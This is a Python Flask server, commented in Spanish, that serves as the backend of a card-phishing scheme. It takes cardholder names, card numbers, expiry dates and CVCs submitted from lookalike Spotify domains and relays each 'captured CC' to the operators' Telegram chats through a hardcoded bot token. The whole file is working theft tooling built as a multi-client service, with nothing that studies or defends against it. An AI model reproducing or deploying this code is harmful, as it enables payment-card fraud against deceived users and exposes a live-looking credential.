import os
from flask import Flask, request, jsonify
from flask_cors import CORS
import requests

app = Flask(__name__)
# Permitimos que tus dominios hablen con el servidor
CORS(app, resources={r"/*": {"origins": "*"}})

# --- CONFIGURACIÓN ---
TELEGRAM_BOT_TOKEN = '8825700631:AAE1L-gbaro7C2TAr4gGMf8P-XUsiyoyleU'

# --- LA LISTA MAESTRA (Solo tú la controlas) ---
# Aquí asocias el DOMINIO con los IDs de TELEGRAM que deben recibir la CC.
# Si un dominio no está aquí, no pasa nada.
CLIENTES_MAPA = {
    'spotlfypremium.online': ['6953415010', '7707049896'],
    'free.spotlfypremium.online': ['-1087968824', '1087968824'],
}

@app.route('/enviar-datos', methods=['POST'])
def recibir_datos():
    # El servidor detecta de qué dominio viene la víctima automáticamente
    dominio_victima = request.headers.get('Host', '').split(':')[0]
    print(f"🌐 PETICIÓN RECIBIDA DESDE EL DOMINIO: {dominio_victima}")

    # Buscamos en nuestra lista quién es el dueño de ese dominio
    lista_de_ids = CLIENTES_MAPA.get(dominio_victima)

    # Si el dominio no está en nuestra lista, ignoramos la petición
    if not lista_de_ids:
        print(f"🚫 DOMINIO NO AUTORIZADO: {dominio_victima}")
        return jsonify({"status": "ignored"}), 200

    # Captura de datos de la tarjeta
    data = request.json
    nombre = data.get('nombre', 'N/A')
    tarjeta = data.get('tarjeta', 'N/A')
    expiracion = data.get('expiracion', 'N/A')
    cvc = data.get('cvc', 'N/A')

    mensaje = (
        f"💰 *NUEVA CC CAPTURADA* 💰\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🌐 *DOMINIO:* `{dominio_victima}`\n"
        f"👤 *Nombre:* `{nombre}`\n"
        f"💳 *Tarjeta:* `{tarjeta}`\n"
        f"📅 *Exp:* `{expiracion}`\n"
        f"🔐 *CVC:* `{cvc}`\n"
        f"━━━━━━━━━━━━━━━━━━"
    )

    # Mandamos la CC a todos los IDs que pertenecen a ese dominio
    exitos = 0
    for id_telegram in lista_de_ids:
        url_telegram = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {"chat_id": id_telegram, "text": mensaje, "parse_mode": "Markdown"}
        try:
            res = requests.post(url_telegram, json=payload, timeout=5)
            if res.status_code == 200:
                exitos += 1
        except:
            continue

    print(f"✅ PROCESO TERMINADO. Enviados a {exitos} personas del dominio {dominio_victima}")
    return jsonify({"status": "success", "enviados": exitos}), 200

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
